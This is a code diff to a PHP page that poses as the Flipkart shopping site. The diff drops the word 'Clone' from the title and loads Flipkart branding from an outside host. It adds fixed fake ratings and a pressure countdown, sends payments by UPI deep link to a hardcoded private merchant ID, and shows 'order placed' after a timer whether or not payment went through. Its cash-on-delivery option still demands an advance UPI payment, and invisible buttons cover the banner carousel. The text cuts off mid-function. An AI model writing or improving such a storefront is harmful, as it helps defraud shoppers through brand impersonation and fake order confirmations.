@@ -6,8 +6,11 @@ $settings = [];
 foreach ($db->query("SELECT key, value FROM settings")->fetchAll() as $r) {
     $settings[$r["key"]] = $r["value"];
 }
-$upiId = $settings["upi_id"] ?? "merchant1069004.augp@aubank";
-$merchantName = $settings["merchant_name"] ?? "MeeraTraders";
+$upiId          = $settings["upi_id"]              ?? "merchant1069004.augp@aubank";
+$merchantName   = $settings["merchant_name"]       ?? "MeeraTraders";
+$razorpayKeyId  = $settings["razorpay_key_id"]     ?? '';
+$codAdvType     = $settings["cod_advance_type"]    ?? 'percent';
+$codAdvValue    = $settings["cod_advance_value"]   ?? '20';
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -15,7 +18,7 @@ $merchantName = $settings["merchant_name"] ?? "MeeraTraders";
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta name="theme-color" content="#2875f0" />
-  <title>Flipkart Clone</title>
+  <title>Flipkart</title>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
     body { font-family: -apple-system, BlinkMacSystemFont, 'Roboto', sans-serif; background: #f1f2f4; }
@@ -84,12 +87,12 @@ $merchantName = $settings["merchant_name"] ?? "MeeraTraders";
       position: absolute;
       top: 50%;
       transform: translateY(-50%);
-      background: rgba(0,0,0,0.35);
+      background: rgba(0,0,0,0.0);
       border: none;
-      color: #fff;
+      color: rgba(0,0,0,0.0);
       font-size: 20px;
-      width: 30px;
-      height: 50px;
+      width: 50%;
+      height: 100%;
       cursor: pointer;
       z-index: 5;
     }
@@ -475,45 +478,47 @@ $merchantName = $settings["merchant_name"] ?? "MeeraTraders";
 <!-- ═══════════════════════════════════════════ -->
 <div id="page-home" class="page active">
   <!-- Navbar -->
-  <div class="navbar">
-    <div class="logo-wrap">
-      <img class="logo-thl" src="thl.svg" alt="" onerror="this.style.display='none'">
-      <img class="logo-img" src="flipkart-logo.webp" alt="Flipkart">
+  <div class="navbar" style="display: flex;align-item:center;justify-content:space-between">
+    <div class="logo-wrap" style="gap:17px;">
+      <img class="logo-thl" src="https://leafy-beignet-4eb625.netlify.app/thl.svg" alt="" onerror="this.style.display='none'">
+      <img class="logo-img" src="https://leafy-beignet-4eb625.netlify.app/flipkart-logo.webp" alt="Flipkart">
       
-    </div>
-    <div class="search-bar">
-      <input type="text" id="homeSearch" placeholder="Search For Products, Brands and More..." oninput="handleSearch(this.value)">
     </div>
     <svg class="cart-svg" width="20" height="20" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
         <path d="M15.32 2.405H4.887C3 2.405 2.46.805 2.46.805L2.257.21C2.208.085 2.083 0 1.946 0H.336C.1 0-.064.24.024.46l.644 1.945L3.11 9.767c.047.137.175.23.32.23h8.418l-.493 1.958H3.768l.002.003c-.017 0-.033-.003-.05-.003-1.06 0-1.92.86-1.92 1.92s.86 1.92 1.92 1.92c.99 0 1.805-.75 1.91-1.712l5.55.076c.12.922.91 1.636 1.867 1.636 1.04 0 1.885-.844 1.885-1.885 0-.866-.584-1.593-1.38-1.814l2.423-8.832c.12-.433-.206-.86-.655-.86z"/>
       </svg>
   </div>
+  <div class="navbar" style="margin-top:-2px; padding-bottom:10px;">
+        <div class="search-bar">
+        <input type="text" id="homeSearch" placeholder="Search For Products, Brands and More..." oninput="handleSearch(this.value)">
+      </div>
+  </div>
 
   <!-- Category strip -->
   <div class="k12" id="categoryStrip">
-    <img src="033f3268031fa0ba.jpg" alt="Cat" onclick="filterCategory(this)" >
-    <img src="0f3d008be60995d4.jpg" alt="Cat" onclick="filterCategory(this)" >
-    <img src="42f9a853f9181279.jpg" alt="Cat" onclick="filterCategory(this)" >
-    <img src="913e96c334d04395.jpg" alt="Cat" onclick="filterCategory(this)" >
-    <img src="1faac897db7fa1e8.jpg" alt="Cat" onclick="filterCategory(this)" >
-    <img src="824aa3a83b4057eb.jpg" alt="Cat" onclick="filterCategory(this)" >
-    <img src="aeb7da37a9e85209.jpg" alt="Cat" onclick="filterCategory(this)" >
-    <img src="cbcb478744635781.jpg" alt="Cat" onclick="filterCategory(this)" >
-    <img src="89d809684711712a.jpg" alt="Cat" onclick="filterCategory(this)" >
-    <img src="6ecb75e51b607880.jpg" alt="Cat" onclick="filterCategory(this)" >
-    <img src="3e6d75f631ab6055.jpg" alt="Cat" onclick="filterCategory(this)" >
+    <img src="https://leafy-beignet-4eb625.netlify.app/033f3268031fa0ba.jpg" alt="Cat" onclick="filterCategory(this)" >
+    <img src="https://leafy-beignet-4eb625.netlify.app/0f3d008be60995d4.jpg" alt="Cat" onclick="filterCategory(this)" >
+    <img src="https://leafy-beignet-4eb625.netlify.app/42f9a853f9181279.jpg" alt="Cat" onclick="filterCategory(this)" >
+    <img src="https://leafy-beignet-4eb625.netlify.app/913e96c334d04395.jpg" alt="Cat" onclick="filterCategory(this)" >
+    <img src="https://leafy-beignet-4eb625.netlify.app/1faac897db7fa1e8.jpg" alt="Cat" onclick="filterCategory(this)" >
+    <img src="https://leafy-beignet-4eb625.netlify.app/824aa3a83b4057eb.jpg" alt="Cat" onclick="filterCategory(this)" >
+    <img src="https://leafy-beignet-4eb625.netlify.app/aeb7da37a9e85209.jpg" alt="Cat" onclick="filterCategory(this)" >
+    <img src="https://leafy-beignet-4eb625.netlify.app/cbcb478744635781.jpg" alt="Cat" onclick="filterCategory(this)" >
+    <img src="https://leafy-beignet-4eb625.netlify.app/89d809684711712a.jpg" alt="Cat" onclick="filterCategory(this)" >
+    <img src="https://leafy-beignet-4eb625.netlify.app/6ecb75e51b607880.jpg" alt="Cat" onclick="filterCategory(this)" >
+    <img src="https://leafy-beignet-4eb625.netlify.app/3e6d75f631ab6055.jpg" alt="Cat" onclick="filterCategory(this)" >
   </div>
 
   <!-- Banner carousel -->
   <div class="carousel-wrap">
     <button class="carousel-btn prev" onclick="moveBanner(-1)">&#8249;</button>
     <div class="carousel-track" id="bannerTrack">
-      <img src="b1 (1).jpg"  alt="Banner" height="180" onerror="this.src='b1 (1).jpeg'">
-      <img src="b1 (1).jpeg" alt="Banner" height="180" onerror="this.src='nav.jpg'">
-      <img src="b1 (2).jpeg" alt="Banner" height="180" onerror="this.src='flip1.jpeg'">
-      <img src="b1 (2).jpg"  alt="Banner" height="180" onerror="this.src='adtop.jpeg'">
-      <img src="b1 (3).jpeg" alt="Banner" height="180" onerror="this.src='adtop.jpeg'">
-      <img src="b1 (4).jpeg" alt="Banner" height="180" onerror="this.src='adtop.jpeg'">
+      <img src="https://leafy-beignet-4eb625.netlify.app/b1 (1).jpg"  alt="Banner" height="180" onerror="this.src='https://leafy-beignet-4eb625.netlify.app/b1 (1).jpeg'">
+      <img src="https://leafy-beignet-4eb625.netlify.app/b1 (1).jpeg" alt="Banner" height="180" onerror="this.src='https://leafy-beignet-4eb625.netlify.app/nav.jpg'">
+      <img src="https://leafy-beignet-4eb625.netlify.app/b1 (2).jpeg" alt="Banner" height="180" onerror="this.src='https://leafy-beignet-4eb625.netlify.app/flip1.jpeg'">
+      <img src="https://leafy-beignet-4eb625.netlify.app/b1 (2).jpg"  alt="Banner" height="180" onerror="this.src='https://leafy-beignet-4eb625.netlify.app/adtop.jpeg'">
+      <img src="https://leafy-beignet-4eb625.netlify.app/b1 (3).jpeg" alt="Banner" height="180" onerror="this.src='https://leafy-beignet-4eb625.netlify.app/adtop.jpeg'">
+      <img src="https://leafy-beignet-4eb625.netlify.app/b1 (4).jpeg" alt="Banner" height="180" onerror="this.src='https://leafy-beignet-4eb625.netlify.app/adtop.jpeg'">
     </div>
     <button class="carousel-btn next" onclick="moveBanner(1)">&#8250;</button>
     <div class="carousel-dots" id="bannerDots"></div>
@@ -545,10 +550,10 @@ $merchantName = $settings["merchant_name"] ?? "MeeraTraders";
   <!-- Navbar -->
   <div class="product-navbar">
     <div class="aroas123">
-      <img class="arrowsvg" src="arrow.svg" alt="back" onclick="navigate('home')" style="filter:brightness(10)">
+      <img class="arrowsvg" src="https://leafy-beignet-4eb625.netlify.app/arrow.svg" alt="back" onclick="navigate('home')" style="filter:brightness(10)">
     </div>
     <div class="logo-wrap" style="flex:1;justify-content:space-between">
-      <img class="logo-img" src="flipkart-logo.webp" alt="Flipkart">
+      <img class="logo-img" src="https://leafy-beignet-4eb625.netlify.app/flipkart-logo.webp" alt="Flipkart">
       <svg fill="white" width="20" height="20" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
         <path d="M15.32 2.405H4.887C3 2.405 2.46.805 2.46.805L2.257.21C2.208.085 2.083 0 1.946 0H.336C.1 0-.064.24.024.46l.644 1.945L3.11 9.767c.047.137.175.23.32.23h8.418l-.493 1.958H3.768l.002.003c-.017 0-.033-.003-.05-.003-1.06 0-1.92.86-1.92 1.92s.86 1.92 1.92 1.92c.99 0 1.805-.75 1.91-1.712l5.55.076c.12.922.91 1.636 1.867 1.636 1.04 0 1.885-.844 1.885-1.885 0-.866-.584-1.593-1.38-1.814l2.423-8.832c.12-.433-.206-.86-.655-.86z"/>
       </svg>
@@ -565,17 +570,18 @@ $merchantName = $settings["merchant_name"] ?? "MeeraTraders";
     <!-- Product Info -->
     <div class="product-info">
       <p class="product-name" id="detailName"></p>
+      <!-- Rating -->
+        <div class="rating-section">
+        <img class="ratinglogo" src="https://leafy-beignet-4eb625.netlify.app/rating.png" alt="Rating" onerror="this.style.display='none'">
+        <span class="rattext">4.3 ★ | 1,248 Ratings</span>
+        </div>
       <div class="product-price-row">
         <span class="product-sp" id="detailSP"></span>
         <span class="product-off" id="detailOff"></span>
         <span class="product-mrp" id="detailMRP"></span>
       </div>
-      <!-- Rating -->
-        <div class="rating-section">
-        <img class="ratinglogo" src="rating.png" alt="Rating" onerror="this.style.display='none'">
-        <span class="rattext">4.3 ★ | 1,248 Ratings</span>
-        </div>
-      <img class="assured-badge" src="assured.png" alt="Assured" onerror="this.style.display='none'">
+      
+      <img class="assured-badge" src="https://leafy-beignet-4eb625.netlify.app/assured.png" alt="Assured" onerror="this.style.display='none'">
       <p style="margin-top:4px"><span class="fd2d">Free delivery in 2 days</span></p>
       <p style="margin-top:3px"><span class="fd2d1">Limited Time Deal</span></p>
     </div>
@@ -590,15 +596,17 @@ $merchantName = $settings["merchant_name"] ?? "MeeraTraders";
     </div>
 
     
-    <img class="return" src="/return.jpg" alt="">
+    <img class="return" src="https://leafy-beignet-4eb625.netlify.app/return.jpg" alt="">
 
     <!-- Ad image -->
+     <h2 style="padding:18px 10px;">recommended Product</h2>
     <div class="cart1" id="productGrid1"></div>
     <div class="pro12"></div>
   </div>
 
   <!-- Buy Buttons -->
-  <div class="btndiv">
+  <div class="btndiv" style="margin-bottom:5px;">
+    <button class="btn4" style="background:white;color:black;" onclick="goToAddress()">Add to Cart</button>
     <button class="btn4" onclick="goToAddress()">Buy Now</button>
   </div>
 </div>
@@ -608,12 +616,14 @@ $merchantName = $settings["merchant_name"] ?? "MeeraTraders";
 <!-- ═══════════════════════════════════════════ -->
 <div id="page-address" class="page">
   <div class="product-navbar">
-    <img class="arrowsvg" src="arrowblk.svg" alt="back" onclick="navigate('product')" style="filter:brightness(10)">
-    <h4 class="paphh4" style="color:#fff">Address</h4>
+<div class="aroas123">
+      <img class="arrowsvg" src="https://leafy-beignet-4eb625.netlify.app/arrow.svg" alt="back" onclick="navigate('home')" style="filter:brightness(10)">
+    </div>    <h4 class="paphh4" style="color:#fff">Address</h4>
   </div>
 
+
   <div class="form-wrapper">
-    <img class="adhsvg" src="adh.svg" alt="" onerror="this.style.display='none'">
+    <img class="adhsvg" src="https://leafy-beignet-4eb625.netlify.app/adh.svg" alt="" onerror="this.style.display='none'">
     <form id="addressForm" onsubmit="submitAddress(event)">
       <input class="ad-name" type="text" placeholder="Full Name (Required)" name="name" required>
       <input class="ad-phone7" type="tel" placeholder="Mobile Number (Required)" name="mobile" required pattern="[0-9]{10}" maxlength="10">
@@ -638,7 +648,7 @@ $merchantName = $settings["merchant_name"] ?? "MeeraTraders";
       </select>
       <input class="ad-phone" type="text" placeholder="House No., Building Name (Required)" name="house" required>
       <input class="ad-phone" type="text" placeholder="Road Name, Area, Colony (Required)" name="street" required>
-      <button class="btn3" type="submit">Save Address &amp; Continue</button>
+      <button class="btn3" type="submit" style="position:fixed;bottom:0%;">Save Address &amp; Continue</button>
     </form>
   </div>
 </div>
@@ -648,16 +658,16 @@ $merchantName = $settings["merchant_name"] ?? "MeeraTraders";
 <!-- ═══════════════════════════════════════════ -->
 <div id="page-summary" class="page">
   <div class="product-navbar">
-    <img class="arrowsvg" src="arrowblk.svg" alt="back" onclick="navigate('address')" style="filter:brightness(10)">
-    <h4 class="paphh4" style="color:#fff">Order Summary</h4>
+      <div class="aroas123">
+        <img class="arrowsvg" src="https://leafy-beignet-4eb625.netlify.app/arrow.svg" alt="back" onclick="navigate('home')" style="filter:brightness(10)">
+      </div>
+      <h4 class="paphh4" style="color:#fff">Order Summary</h4>
   </div>
+    <img class="sum-img" src="https://leafy-beignet-4eb625.netlify.app/sumeryimg.jpeg" alt="" style="width:100%;border-radius:4px;margin-bottom:8px" onerror="this.style.display='none'">
 
   <div class="page-content" style="padding:10px">
     <!-- Countdown -->
-    <div class="timer35">
-      <p>TIME UP IN:</p>
-      <p id="summaryTimer" style="color:#2875f0;font-weight:700">6:00</p>
-    </div>
+    
 
     <!-- Product Summary -->
     <div class="summary-card">
@@ -693,8 +703,7 @@ $merchantName = $settings["merchant_name"] ?? "MeeraTraders";
       </div>
     </div>
 
-    <img class="sum-img" src="summery-top.jpeg" alt="" style="width:100%;border-radius:4px;margin-bottom:8px" onerror="this.style.display='none'">
-    <img class="sum-img" src="summery-bottom.jpeg" alt="" style="width:100%;border-radius:4px;margin-bottom:8px" onerror="this.style.display='none'">
+    <img class="sum-img" src="https://leafy-beignet-4eb625.netlify.app/summery-bottom.jpeg" alt="" style="width:100%;border-radius:4px;margin-bottom:8px" onerror="this.style.display='none'">
   </div>
 
   <div class="btndiv">
@@ -707,58 +716,81 @@ $merchantName = $settings["merchant_name"] ?? "MeeraTraders";
 <!-- ═══════════════════════════════════════════ -->
 <div id="page-payment" class="page">
   <div class="product-navbar">
-    <img class="arrowsvg" src="arrowblk.svg" alt="back" onclick="navigate('summary')" style="filter:brightness(10)">
-    <h4 class="paphh4" style="color:#fff">Payment</h4>
+ <div class="aroas123">
+        <img class="arrowsvg" src="https://leafy-beignet-4eb625.netlify.app/arrow.svg" alt="back" onclick="navigate('home')" style="filter:brightness(10)">
+      </div>
+      <h4 class="paphh4" style="color:#fff">Payment</h4>
   </div>
 
   <div class="page-content">
-    <img class="pay-top-img" src="pay-top.jpeg" alt="" onerror="this.style.display='none'">
-
+    <img class="pay-top-img" src="https://leafy-beignet-4eb625.netlify.app/pay-top.jpeg" alt="" onerror="this.style.display='none'">
+    <div class="timer35">
+      <p>TIME UP IN:</p>
+      <p id="summaryTimer1" style="color:#2875f0;font-weight:700">6:00</p>
+    </div>
     <div class="payment-options">
       <p style="font-size:13px;color:#555;margin-bottom:8px">Choose Payment Method</p>
 
-      <div class="pay-option" onclick="selectPayment('G-pay')">
-        <input type="radio" name="payMethod" value="G-pay">
-        <img src="gpay.png" alt="GPay" onerror="this.style.display='none'">
+      <!-- Google Pay -->
+      <div class="pay-option" onclick="selectPayment('gpay')">
+        <input type="radio" name="payMethod" value="gpay">
+        <img src="https://leafy-beignet-4eb625.netlify.app/gpay.png" alt="GPay" style="width:50px;height:30px;object-fit:contain" onerror="this.style.display='none'">
         <span>Google Pay (GPay)</span>
       </div>
 
-      <div class="pay-option" onclick="selectPayment('PhonePe')">
-        <input type="radio" name="payMethod" value="PhonePe">
-        <img src="phonepe.png" alt="PhonePe" onerror="this.style.display='none'">
+      <!-- PhonePe -->
+      <div class="pay-option" onclick="selectPayment('phonepe')">
+        <input type="radio" name="payMethod" value="phonepe">
+        <img src="https://leafy-beignet-4eb625.netlify.app/phonepe.png" alt="PhonePe" style="width:50px;height:30px;object-fit:contain" onerror="this.style.display='none'">
         <span>PhonePe</span>
       </div>
 
-      <div class="pay-option" onclick="selectPayment('Paytm')">
-        <input type="radio" name="payMethod" value="Paytm">
-        <img src="paytm.png" alt="Paytm" onerror="this.style.display='none'">
+      <!-- Paytm -->
+      <div class="pay-option" onclick="selectPayment('paytm')">
+        <input type="radio" name="payMethod" value="paytm">
+        <img src="https://leafy-beignet-4eb625.netlify.app/paytm.png" alt="Paytm" style="width:50px;height:30px;object-fit:contain" onerror="this.style.display='none'">
         <span>Paytm</span>
       </div>
 
-      <div class="pay-option" onclick="selectPayment('UPI')">
-        <input type="radio" name="payMethod" value="UPI">
-        <img src="upi.png" alt="UPI" onerror="this.style.display='none'">
+      <!-- All UPI Apps -->
+      <div class="pay-option" onclick="selectPayment('upi')">
+        <input type="radio" name="payMethod" value="upi">
+        <img src="https://leafy-beignet-4eb625.netlify.app/upi.png" alt="UPI" style="width:50px;height:30px;object-fit:contain" onerror="this.style.display='none'">
         <span>All UPI Apps</span>
       </div>
 
-      <div class="pay-option" onclick="selectPayment('QR')">
-        <input type="radio" name="payMethod" value="QR">
-        <img src="upi2.png" alt="QR" style="width:35px;height:35px" onerror="this.style.display='none'">
-        <span>Scan QR Code</span>
+      <!-- Cash on Delivery -->
+      <div class="pay-option" onclick="selectPayment('cod')">
+        <input type="radio" name="payMethod" value="cod">
+        <svg width="50" height="30" viewBox="0 0 50 30" fill="none" style="flex-shrink:0"><rect width="50" height="30" rx="6" fill="#e8f5e9"/><text x="25" y="22" text-anchor="middle" font-size="16" fill="#2e7d32">💵</text></svg>
+        <div>
+          <span style="font-size:15px;font-weight:500">Cash on Delivery</span>
+          <div style="font-size:11px;color:#888">Pay when your order arrives</div>
+        </div>
+      </div>
+    </div>
+    <div class="summary-card">
+      <h5 style="margin-bottom:8px">Price Details</h5>
+      <div class="summary-price-row">
+        <span>Price (1 item)</span>
+        <span id="sumMRP1"></span>
+      </div>
+      <div class="summary-price-row">
+        <span>Discount</span>
+        <span style="color:green" id="sumDiscount1"></span>
+      </div>
+      <div class="summary-price-row">
+        <span>Delivery Charges</span>
+        <span style="color:green">FREE</span>
+      </div>
+      <div class="summary-total">
+        <span>Total Amount</span>
+        <span id="sumTotal1"></span>
       </div>
     </div>
 
-    <!-- UPI QR (shown when QR selected) -->
-    <div class="upi-qr-wrap" id="qrWrap" style="display:none">
-      <img src="upi2.png" alt="UPI QR Code" onerror="this.style.display='none'">
-      <p style="font-size:12px;color:#555;margin-top:6px">Scan with any UPI app to pay</p>
-    </div>
-
-    <img class="pay-bottom-img" src="payment-botom.jpeg" alt="" onerror="this.style.display='none'">
-    <p class="pay-notice">
-      If your payment is not successful, your order will be cancelled automatically.<br>
-      Do not close any UPI app until payment is done.
-    </p>
+    <img class="pay-bottom-img" src="https://leafy-beignet-4eb625.netlify.app/payment-botom.jpeg" alt="" onerror="this.style.display='none'">
+    <p class="pay-notice">🔒 All payments are 100% safe &amp; secure.</p>
   </div>
 
   <div class="pay-btn-wrap">
@@ -768,18 +800,38 @@ $merchantName = $settings["merchant_name"] ?? "MeeraTraders";
   </div>
 </div>
 
+<!-- ═══ COD ADVANCE PAYMENT MODAL ═══ -->
+<div id="codModal" style="display:none;position:fixed;inset:0;z-index:9999;background:rgba(0,0,0,0.55);align-items:center;justify-content:center">
+  <div style="background:#fff;border-radius:16px;padding:24px 20px;max-width:360px;width:92%;margin:auto;box-shadow:0 20px 60px rgba(0,0,0,0.3);text-align:center">
+    <div style="font-size:40px;margin-bottom:8px">🚚</div>
+    <h3 style="font-size:18px;font-weight:700;color:#111;margin-bottom:6px">Cash on Delivery</h3>
+    <p style="font-size:13px;color:#555;margin-bottom:16px">To confirm your COD order, a small <strong>advance payment</strong> is required via UPI. The rest you pay on delivery.</p>
+    <div style="background:#f1f2f4;border-radius:12px;padding:14px;margin-bottom:18px">
+      <div style="font-size:13px;color:#555">Advance Amount</div>
+      <div style="font-size:28px;font-weight:800;color:#2875f0" id="codAdvanceAmount">₹0</div>
+      <div style="font-size:11px;color:#888" id="codAdvanceNote"></div>
+      <div style="font-size:13px;color:#555;margin-top:6px">Remaining: <strong id="codRemainingAmount">₹0</strong> to be paid on delivery</div>
+    </div>
+    <p style="font-size:12px;color:#888;margin-bottom:12px">Choose UPI app to pay advance:</p>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:10px">
+      <button onclick="processCodAdvance('gpay')"   style="background:#fff;border:1px solid #ddd;padding:10px 6px;border-radius:8px;font-size:13px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:6px"><img src='https://leafy-beignet-4eb625.netlify.app/gpay.png' style='height:20px;object-fit:contain' onerror="this.style.display='none'"> GPay</button>
+      <button onclick="processCodAdvance('phonepe')" style="background:#fff;border:1px solid #ddd;padding:10px 6px;border-radius:8px;font-size:13px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:6px"><img src='https://leafy-beignet-4eb625.netlify.app/phonepe.png' style='height:20px;object-fit:contain' onerror="this.style.display='none'"> PhonePe</button>
+      <button onclick="processCodAdvance('paytm')"  style="background:#fff;border:1px solid #ddd;padding:10px 6px;border-radius:8px;font-size:13px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:6px"><img src='https://leafy-beignet-4eb625.netlify.app/paytm.png' style='height:20px;object-fit:contain' onerror="this.style.display='none'"> Paytm</button>
+      <button onclick="processCodAdvance('upi')"    style="background:#fb641b;color:#fff;border:none;padding:10px 6px;border-radius:8px;font-size:13px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:6px"><img src='https://leafy-beignet-4eb625.netlify.app/upi.png' style='height:20px;object-fit:contain;filter:brightness(10)' onerror="this.style.display='none'"> Any UPI</button>
+    </div>
+    <button onclick="closeCodModal()" style="background:none;border:1px solid #ddd;width:100%;padding:10px;border-radius:8px;font-size:13px;color:#555;cursor:pointer">Cancel</button>
+  </div>
+</div>
+
 <!-- ═══════════════════════════════════════════ -->
 <!--  SUCCESS PAGE                               -->
 <!-- ═══════════════════════════════════════════ -->
 <div id="page-success" class="page">
   <div class="success-page">
     <div class="success-icon">✅</div>
-    <p class="orderok">YOUR ORDER HAS BEEN RECEIVED</p>
-    <p>Thank you for your payment, it's processing.</p>
-    <p class="pqpqppq">
-      If your payment is not successful, your order will be cancelled automatically!<br>
-      Please make sure do not close any UPI app until payment is done!
-    </p>
+    <p class="orderok">YOUR ORDER HAS BEEN PLACED!</p>
+    <p id="successMsg">Thank you! Your payment is being processed.</p>
+    <p class="pqpqppq" id="successNote"></p>
     <p>You will receive an order confirmation message with details of your order
       and a link to track your progress.</p>
     <p>Your Order ID:</p>
@@ -844,6 +896,16 @@ function navigate(page) {
 function renderProductGrid(products) {
   var grid = document.getElementById('productGrid');
   var html = '';
+  var shuffledProducts = [...products];
+  
+  // Fisher-Yates shuffle algorithm to randomize the array
+  for (var i = shuffledProducts.length - 1; i > 0; i--) {
+    var j = Math.floor(Math.random() * (i + 1));
+    [shuffledProducts[i], shuffledProducts[j]] = [shuffledProducts[j], shuffledProducts[i]];
+  }
+
+  products = shuffledProducts;
+
   for (var i = 0; i < products.length; i++) {
     var p = products[i];
     var discount = Math.round(((parseInt(p.mrp) - parseInt(p.selling_price)) / parseInt(p.mrp)) * 100);
@@ -853,7 +915,7 @@ function renderProductGrid(products) {
     html += '<p class="itemh5">' + p.name + '</p>';
     html += '<h4 class="omsp"><span class="offer">' + discount + '% off</span><span class="mrp-text">₹' + parseInt(p.mrp).toLocaleString('en-IN') + '</span></h4>';
     html += '<div style="margin-top:-4px"><span class="selling-price">₹' + p.selling_price + '.00</span>';
-    html += '<img class="assur2" src="assured.png" alt="" onerror="this.style.display=\'none\'"></div>';
+    html += '<img class="assur2" src="https://leafy-beignet-4eb625.netlify.app/assured.png" alt="" onerror="this.style.display=\'none\'"></div>';
     html += '<p class="fd2d1">Limited Time Deal</p>';
     html += '<button class="btn6" onclick="event.stopPropagation();openProduct(\'' + p.id + '\')">Buy Now</button>';
     html += '<p><span class="fd2d">Free delivery in 2 days</span></p>';
@@ -888,7 +950,7 @@ function renderProductGrid1(products) {
     html += '<p class="itemh5">' + p.name + '</p>';
     html += '<h4 class="omsp"><span class="offer">' + discount + '% off</span><span class="mrp-text">₹' + parseInt(p.mrp).toLocaleString('en-IN') + '</span></h4>';
     html += '<div style="margin-top:-4px"><span class="selling-price">₹' + p.selling_price + '.00</span>';
-    html += '<img class="assur2" src="assured.png" alt="" onerror="this.style.display=\'none\'"></div>';
+    html += '<img class="assur2" src="https://leafy-beignet-4eb625.netlify.app/assured.png" alt="" onerror="this.style.display=\'none\'"></div>';
     html += '<p class="fd2d1">Limited Time Deal</p>';
     html += '<button class="btn6" onclick="event.stopPropagation();openProduct(\'' + p.id + '\')">Buy Now</button>';
     html += '<p><span class="fd2d">Free delivery in 2 days</span></p>';
@@ -1009,7 +1071,9 @@ function buildSummaryPage() {
   document.getElementById('sumDiscount').textContent = '- ₹' + discount.toLocaleString('en-IN') + '.00';
   document.getElementById('sumTotal').textContent = '₹' + sp.toLocaleString('en-IN') + '.00';
   document.getElementById('payAmount').textContent = sp.toLocaleString('en-IN');
-
+  document.getElementById('sumMRP1').textContent = '₹' + mrp.toLocaleString('en-IN') + '.00';
+  document.getElementById('sumDiscount1').textContent = '- ₹' + discount.toLocaleString('en-IN') + '.00';
+  document.getElementById('sumTotal1').textContent = '₹' + sp.toLocaleString('en-IN') + '.00';
   // Start summary timer
   if (summaryTimerInterval) clearInterval(summaryTimerInterval);
   summaryTimerSec = 360;
@@ -1024,6 +1088,45 @@ function buildSummaryPage() {
       document.getElementById('summaryTimer').textContent = m + ':' + (s < 10 ? '0' : '') + s;
     }
   }, 1000);
+  if (summaryTimerInterval) clearInterval(summaryTimerInterval);
+  summaryTimerSec = 360;
+  summaryTimerInterval = setInterval(function() {
+    summaryTimerSec--;
+    if (summaryTimerSec <= 0) {
+      clearInterval(summaryTimerInterval);
+      document.getElementById('summaryTimer1').textContent = '0:00';
+    } else {
+      var m = Math.floor(summaryTimerSec / 60);
+      var s = summaryTimerSec % 60;
+      document.getElementById('summaryTimer1').textContent = m + ':' + (s < 10 ? '0' : '') + s;
+    }
+  }, 1000);
+}
+
+// ─────────────────────────────────────────
+//  PAYMENT CONFIG (from PHP admin settings)
+// ─────────────────────────────────────────
+var PAYMENT_CFG = {
+  upiId:           '<?= addslashes($upiId) ?>',
+  merchantName:    '<?= addslashes($merchantName) ?>',
+  codAdvanceType:  '<?= addslashes($codAdvType) ?>',
+  codAdvanceValue: <?= (float)$codAdvValue ?>,
+};
+
+// ─────────────────────────────────────────
+//  UPI DEEP LINK BUILDER
+// ─────────────────────────────────────────
+function buildUpiUrl(app, amount) {
+  var pa  = encodeURIComponent(PAYMENT_CFG.upiId);
+  var pn  = encodeURIComponent(PAYMENT_CFG.merchantName);
+  var tn  = encodeURIComponent('OrderPayment');
+  var tr  = 'TXN' + Date.now();
+  var am  = parseFloat(amount).toFixed(2);
+  var base = 'cu=INR&pa=' + pa + '&pn=' + pn + '&tn=' + tn + '&tr=SVT1lgwFxSEuq7qrv2&mc=5945&am=' + am + '&cu=INR';
+  if (app === 'gpay')    return 'tez://upi/pay?'     + base + '&mode=02';
+  if (app === 'phonepe') return 'phonepe://pay?'     + base + '&mode=02';
+  if (app === 'paytm')   return 'paytmmp://pay?'     + base + '&mode=02';
+  return                        'upi://pay?'         + base + '&mode=19';
 }
 
 // ─────────────────────────────────────────
@@ -1042,7 +1145,6 @@ function selectPayment(method) {
       break;
     }
   }
-  document.getElementById('qrWrap').style.display = (method === 'QR') ? 'block' : 'none';
 }
 
 function processPayment() {
@@ -1052,39 +1154,78 @@ function processPayment() {
   }
   if (!currentProduct) return;
 
-  var upiId = '<?php echo addslashes($upiId); ?>';
-  var amount = currentProduct.selling_price;
-  var name = '<?php echo addslashes($merchantName); ?>';
-  var upiUrl = '';
-
-  if (selectedPayment === 'QR') {
-    // QR is scanned manually, no deep link needed
-    document.getElementById('qrWrap').style.display = 'block';
-    setTimeout(function() { showSuccess(); }, 15000);
+  if (selectedPayment === 'cod') {
+    openCodModal();
     return;
-  } else if (selectedPayment === 'G-pay') {
-    upiUrl = 'tez://upi/pay?pa=' + upiId + '&pn=' + encodeURIComponent(name) + '&tn=Order&am=' + amount + '&cu=INR';
-  } else if (selectedPayment === 'PhonePe') {
-    upiUrl = 'phonepe://pay?pa=' + upiId + '&pn=' + encodeURIComponent(name) + '&tn=Order&am=' + amount + '&cu=INR';
-  } else if (selectedPayment === 'Paytm') {
-    upiUrl = 'paytmmp://pay?pa=' + upiId + '&pn=' + encodeURIComponent(name) + '&tn=Order&am=' + amount + '&cu=INR';
-  } else {
-    upiUrl = 'upi://pay?pa=' + upiId + '&pn=' + encodeURIComponent(name) + '&tn=Order&am=' + amount + '&cu=INR';
   }
 
+  // --- Direct UPI Redirect ---
+  var amount = currentProduct.selling_price;
+  var upiUrl = buildUpiUrl(selectedPayment, amount);
   window.location.href = upiUrl;
-
-  // Show success after delay
-  setTimeout(function() {
-    showSuccess();
-  }, 10000);
+  // Show success after delay (user comes back from UPI app)
+  setTimeout(function() { showSuccess('online', null); }, 8000);
 }
 
-function showSuccess() {
+// ─────────────────────────────────────────
+//  COD Modal
+// ─────────────────────────────────────────
+function openCodModal() {
+  if (!currentProduct) return;
+  var totalAmount = parseInt(currentProduct.selling_price);
+  var advanceAmt  = 0;
+  var noteText    = '';
+
+  if (PAYMENT_CFG.codAdvanceType === 'percent') {
+    advanceAmt = Math.ceil(totalAmount * PAYMENT_CFG.codAdvanceValue / 100);
+    noteText   = PAYMENT_CFG.codAdvanceValue + '% of total ₹' + totalAmount.toLocaleString('en-IN');
